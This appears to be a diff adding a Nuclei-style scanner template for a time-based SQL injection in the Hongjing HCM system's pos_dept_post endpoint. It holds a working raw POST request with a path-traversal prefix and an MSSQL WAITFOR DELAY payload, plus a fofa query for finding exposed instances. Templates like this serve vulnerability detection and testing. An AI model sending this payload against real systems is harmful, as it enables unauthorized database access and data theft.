@@ -1,0 +1,30 @@
+id: hjsoft-pos_dept_post-sqli
+
+info:
+  name: 宏景 HCM 系统 pos_dept_post - sqli
+  author: leadlife
+  severity: high
+  description: 宏景 HCM 系统 pos_dept_post 接口存在 SQL 注入漏洞，由于传入的数据没有预编译和充足的校验，未授权的攻击者可利用该漏洞获取数据库敏感信息。
+  reference:
+    - todo
+  metadata:
+    verified: true
+    fofa-query: app="HJSOFT-HCM"
+  tags: hjsoft,sqli,time
+
+http:
+  - raw:
+      - |
+        @timeout: 15s
+        POST /templates/attestation/../../pos/roleinfo/pos_dept_post HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        usertable=h00&usernumber=1&i9999=-1';WAITFOR DELAY '0:0:6'--+
+    
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - duration >= 5 && duration < 9
+        condition: and
